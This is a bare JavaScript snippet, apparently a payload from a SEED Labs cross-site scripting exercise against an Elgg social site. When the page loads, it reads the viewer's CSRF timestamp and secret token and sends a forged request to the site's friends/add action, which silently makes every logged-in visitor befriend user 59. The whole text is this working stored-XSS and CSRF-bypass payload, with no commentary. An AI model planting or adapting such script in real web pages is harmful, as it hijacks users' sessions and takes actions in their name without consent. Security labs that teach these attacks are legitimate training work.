<script type ="text/javascript">

window.onload = async function () {
      
     // set the timestamp and secret token parameters
     const TIME_STAMP ="&__elgg_ts=" + elgg.security.token.__elgg_ts;
     const TOKEN ="&__elgg_token=" + elgg.security.token.__elgg_token;
     
     const URL = "http://www.seed-server.com/action/friends/add" + "?friend=59" + TOKEN + TIME_STAMP;
   
     
     // Sending the get request to the server using fetch Javascript Library
     try{
     	await fetch(URL, {
     	method: "GET",
     	headers:{
     		"host": "www.seed-server.com",
     		"content-type": "application/x-www-form-urlencoded"
     		}
     	
     	});
     	
     }catch(error){
     	console.log(error);
     }
}

</script>
